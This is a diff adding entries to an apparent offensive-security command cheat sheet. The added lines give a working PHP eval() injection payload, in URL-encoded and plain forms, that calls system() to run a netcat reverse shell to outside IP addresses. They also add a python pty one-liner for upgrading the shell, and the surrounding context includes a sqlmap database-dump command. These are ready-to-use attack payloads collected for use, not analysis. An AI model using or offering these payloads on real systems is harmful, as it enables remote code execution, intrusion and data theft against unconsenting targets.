@@ -1382,6 +1382,18 @@ bash/zsh + linux terminal cli tools commands
   - e.g: sqlmap -u "http://192.168.1.18/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
 
 ---------------------------------------------------------------------
+php eval() exploit
+---------------------------------------------------------------------
+- /index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.22.129%205555%27)};%23
+  - /index.php?page=index');${system('nc -e /bin/sh 192.168.3.2 4444')};%23
+
+---------------------------------------------------------------------
+upgrade simple shell to tty (bash)
+---------------------------------------------------------------------
+- python -c 'import pty; pty.spawn("/bin/bash")'
+- {https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/}
+
+---------------------------------------------------------------------
 python simple http server
 ---------------------------------------------------------------------
 - python2:
